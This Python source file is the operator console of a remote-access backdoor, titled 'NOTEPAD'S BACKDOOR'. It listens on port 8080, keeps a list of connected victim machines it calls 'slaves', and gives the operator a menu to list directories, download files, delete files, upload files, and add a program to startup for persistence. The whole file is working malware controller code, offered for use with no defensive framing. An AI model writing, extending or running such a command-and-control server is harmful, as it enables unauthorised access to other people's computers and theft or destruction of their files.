import os
import socket
import threading
from colorama import Fore, Back


# List to hold connected client addresses and their sockets
runningslaves = []
clients_lock = threading.Lock()

def handle_client(conn, addr):
    global runningslaves
    with clients_lock:
        runningslaves.append((conn, addr))
        print(f"Connection from {addr} has been established.")
        print("Currently connected clients:", [addr for _, addr in runningslaves])

    try:
        while True:
            # Keep the connection alive
            pass
    except ConnectionResetError:
        print(f"Connection with {addr} has been lost.")
    finally:
        with clients_lock:
            runningslaves.remove((conn, addr))
            print(f"Connection with {addr} closed. Currently connected clients: {[addr for _, addr in runningslaves]}")
        conn.close()

def command_handler():
    global runningslaves
    while True:
        with clients_lock:
            print("\nConnected clients:")
            for i, (_, addr) in enumerate(runningslaves):
                print(f"{i}. {addr}")

        choice = input("Select a client by number to interact or type 'exit' to quit: ")
        if choice.lower() == "exit":
            break

        try:
            choice = int(choice)
            conn, addr = runningslaves[choice]
            print(f"Interacting with client {addr}")
            while True:
                print(f"""
{Back.LIGHTRED_EX}{Fore.BLACK}// Commands List{Back.BLACK}{Fore.WHITE}
* logout
* view_cwd
* custom_dir
* download_file
* remove_file
* send_file
* startup
""")
                command = input("Command >> ")
                if command.lower() == "logout":
                    print(f"Logging out from client {addr}")
                    break
                if conn.fileno() == -1:
                    print(f"Connection with client {addr} has been lost.")
                    break
                try:
                    conn.send(command.encode())
                
                    if command == "view_cwd":
                        files = conn.recv(500000).decode()
                        print("Command output: ", files)
                    elif command == "custom_dir":
                        user_input = input("Custom Dir: ")
                        conn.send(user_input.encode())
                        files = conn.recv(5000).decode()
                        print("Custom Dir Result: ", files)
                    elif command == "download_file":
                        filepath = input("Please enter the file path including the filename: ")
                        conn.send(filepath.encode())
                        file = conn.recv(1000000)
                        filename = input("Please enter file name for the incoming file including the extension: ")
                        with open(filename, "wb") as new_file:
                            new_file.write(file)
                        print(f"{filename} has been downloaded and saved.")
                    elif command == "remove_file":
                        file_and_dir = input("Please enter the file name and dir: ")
                        conn.send(file_and_dir.encode())
                        print("Command has been executed successfully: File Removed")
                    elif command == "send_file":
                        file = input("Please enter the filename and dir of the file: ")
                        filename = input("Please enter the filename for the file being sent: ")
                        with open(file, "rb") as data:
                            file_data = data.read(7000)  # Adjust the size for large files
                        conn.send(filename.encode())
                        conn.send(file_data)
                        print(f"{file} has been sent successfully.")
                    elif command == "startup":
                        print("")
                        print("Added file to startup...")
                        print("")
                    else:
                        print("Command not recognized")
                except (BrokenPipeError, ConnectionResetError):
                    print(f"Connection with client {addr} has been lost.")
                    break
        except (ValueError, IndexError):
            print("Invalid selection. Please try again.")

def start_server():
    s = socket.socket()
    host = socket.gethostname()
    port = 8080
    s.bind((host, port))
    s.listen(5)
    os.system("cls && title NOTEPAD'S BACKDOOR")
    print(f"""
{Fore.LIGHTMAGENTA_EX}
 ═╗ ╦  ╔╗╔╔═╗╔╦╗╔═╗╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔═╗╦╔═╦╔═╔╦╗╔═╗╦═╗  ═╗ ╦
 ╔╩╦╝  ║║║║ ║ ║ ║╣ ╠═╝╠═╣ ║║╚═╗  ╠╩╗╠═╣║  ╠╩╗╠╩╗ ║║║ ║╠╦╝  ╔╩╦╝
 ╩ ╚═  ╝╚╝╚═╝ ╩ ╚═╝╩  ╩ ╩═╩╝╚═╝  ╚═╝╩ ╩╚═╝╩ ╩╩ ╩═╩╝╚═╝╩╚═  ╩ ╚═
{Fore.WHITE}
""")
    print(f"Server is currently running @ {host} on port {port}")
    print("Waiting for incoming connections...")

    threading.Thread(target=command_handler).start()

    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

if __name__ == "__main__":
    start_server()
